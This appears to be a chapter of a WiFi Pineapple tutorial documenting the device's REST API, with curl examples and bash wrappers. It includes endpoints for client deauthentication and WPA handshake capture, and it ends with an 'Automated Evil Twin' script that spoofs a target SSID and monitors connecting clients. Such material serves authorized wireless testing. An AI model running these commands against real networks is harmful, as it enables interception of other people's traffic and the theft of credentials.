# WiFi Pineapple API Reference

## Overview

The WiFi Pineapple provides a REST API for automation and integration. This enables scripted control of all device features.

---

## API Basics

### Base URL
```
http://172.16.42.1:1471/api
```

### Authentication
```bash
# Token-based authentication
curl -H "Authorization: Bearer $TOKEN" http://172.16.42.1:1471/api/status
```

### Response Format
All responses are JSON:
```json
{
  "success": true,
  "data": {},
  "error": null
}
```

---

## System Endpoints

### Get Status
```bash
# System status
curl http://172.16.42.1:1471/api/status

# Response
{
  "uptime": 3600,
  "hostname": "Pineapple",
  "version": "2.7.0",
  "storage": {"used": 50, "total": 2048}
}
```

### System Commands
```bash
# Reboot
curl -X POST http://172.16.42.1:1471/api/reboot

# Shutdown
curl -X POST http://172.16.42.1:1471/api/shutdown

# LED control
curl -X POST http://172.16.42.1:1471/api/led -d "color=blue"
```

---

## PineAP Endpoints

### Control
```bash
# Start PineAP
curl -X POST http://172.16.42.1:1471/api/pineap/start

# Stop PineAP
curl -X POST http://172.16.42.1:1471/api/pineap/stop

# Status
curl http://172.16.42.1:1471/api/pineap/status
```

### Configuration
```bash
# Enable KARMA
curl -X POST http://172.16.42.1:1471/api/pineap/karma/enable

# Disable KARMA
curl -X POST http://172.16.42.1:1471/api/pineap/karma/disable

# Enable beacon response
curl -X POST http://172.16.42.1:1471/api/pineap/beacon/enable

# Set channel
curl -X POST http://172.16.42.1:1471/api/pineap/channel -d "channel=6"
```

### SSID Pool
```bash
# List SSIDs
curl http://172.16.42.1:1471/api/pineap/ssids

# Add SSID
curl -X POST http://172.16.42.1:1471/api/pineap/ssid/add -d "ssid=FreeWiFi"

# Remove SSID
curl -X POST http://172.16.42.1:1471/api/pineap/ssid/remove -d "ssid=FreeWiFi"

# Clear pool
curl -X POST http://172.16.42.1:1471/api/pineap/ssids/clear
```

### Clients
```bash
# List connected clients
curl http://172.16.42.1:1471/api/pineap/clients

# Deauth client
curl -X POST http://172.16.42.1:1471/api/pineap/deauth -d "mac=AA:BB:CC:DD:EE:FF"
```

---

## Recon Endpoints

### Scanning
```bash
# Start scan
curl -X POST http://172.16.42.1:1471/api/recon/start

# Stop scan
curl -X POST http://172.16.42.1:1471/api/recon/stop

# Get results
curl http://172.16.42.1:1471/api/recon/results
```

### Handshakes
```bash
# List handshakes
curl http://172.16.42.1:1471/api/handshakes

# Download handshake
curl http://172.16.42.1:1471/api/handshakes/download/capture.cap -o capture.cap
```

---

## Module Endpoints

### List Modules
```bash
curl http://172.16.42.1:1471/api/modules
```

### Module Control
```bash
# Start module
curl -X POST http://172.16.42.1:1471/api/modules/ModuleName/start

# Stop module
curl -X POST http://172.16.42.1:1471/api/modules/ModuleName/stop

# Module API
curl http://172.16.42.1:1471/api/modules/ModuleName/endpoint
```

---

## Bash Integration

### API Wrapper Functions

```bash
#!/bin/bash
# Pineapple API wrapper

API_BASE="http://172.16.42.1:1471/api"
API_TOKEN="your_token_here"

# Generic API call
api_call() {
    local method="${1:-GET}"
    local endpoint="$2"
    local data="$3"

    if [ "$method" = "GET" ]; then
        curl -s -H "Authorization: Bearer $API_TOKEN" \
            "${API_BASE}${endpoint}"
    else
        curl -s -X "$method" \
            -H "Authorization: Bearer $API_TOKEN" \
            -d "$data" \
            "${API_BASE}${endpoint}"
    fi
}

# Convenience functions
pineap_start() {
    api_call POST "/pineap/start"
}

pineap_stop() {
    api_call POST "/pineap/stop"
}

pineap_status() {
    api_call GET "/pineap/status"
}

pineap_add_ssid() {
    api_call POST "/pineap/ssid/add" "ssid=$1"
}

pineap_clients() {
    api_call GET "/pineap/clients"
}

# Usage
pineap_start
pineap_add_ssid "FreeWiFi"
CLIENTS=$(pineap_clients)
echo "Connected: $CLIENTS"
```

### Monitoring Script

```bash
#!/bin/bash
# Monitor via API

API="http://172.16.42.1:1471/api"

while true; do
    # Get client count
    CLIENTS=$(curl -s "$API/pineap/clients" | grep -c '"mac"')

    # Get status
    STATUS=$(curl -s "$API/pineap/status" | grep -o '"enabled":[^,]*')

    echo "[$(date)] Clients: $CLIENTS | $STATUS"

    # Alert on new client
    if [ "$CLIENTS" -gt "$LAST_COUNT" ]; then
        echo "NEW CLIENT CONNECTED!"
    fi

    LAST_COUNT=$CLIENTS
    sleep 10
done
```

### Automated Attack

```bash
#!/bin/bash
# Automated Evil Twin via API

TARGET_SSID="$1"
API="http://172.16.42.1:1471/api"

# Clear and set SSID
curl -s -X POST "$API/pineap/ssids/clear"
curl -s -X POST "$API/pineap/ssid/add" -d "ssid=$TARGET_SSID"

# Configure and start
curl -s -X POST "$API/pineap/karma/disable"
curl -s -X POST "$API/pineap/beacon/enable"
curl -s -X POST "$API/pineap/start"

echo "Evil Twin active: $TARGET_SSID"

# Monitor
while true; do
    CLIENTS=$(curl -s "$API/pineap/clients")
    echo "Clients: $CLIENTS"
    sleep 5
done
```

---

## Error Handling

```bash
api_call() {
    local response
    response=$(curl -s -w "\n%{http_code}" "$@")

    local body=$(echo "$response" | head -n -1)
    local code=$(echo "$response" | tail -n 1)

    if [ "$code" -ge 400 ]; then
        echo "API Error: HTTP $code" >&2
        return 1
    fi

    echo "$body"
    return 0
}
```

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────────┐
│                  API QUICK REFERENCE                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  PINEAP:                                                     │
│    POST /pineap/start                                        │
│    POST /pineap/stop                                         │
│    GET  /pineap/status                                       │
│    POST /pineap/karma/enable|disable                         │
│    GET  /pineap/clients                                      │
│                                                              │
│  RECON:                                                      │
│    POST /recon/start                                         │
│    GET  /recon/results                                       │
│    GET  /handshakes                                          │
│                                                              │
│  SYSTEM:                                                     │
│    GET  /status                                              │
│    POST /reboot                                              │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

[← Bash Scripting](06_Bash_Scripting.md) | [Back to Fundamentals](README.md) | [Next: Module Development →](08_Module_Development.md)
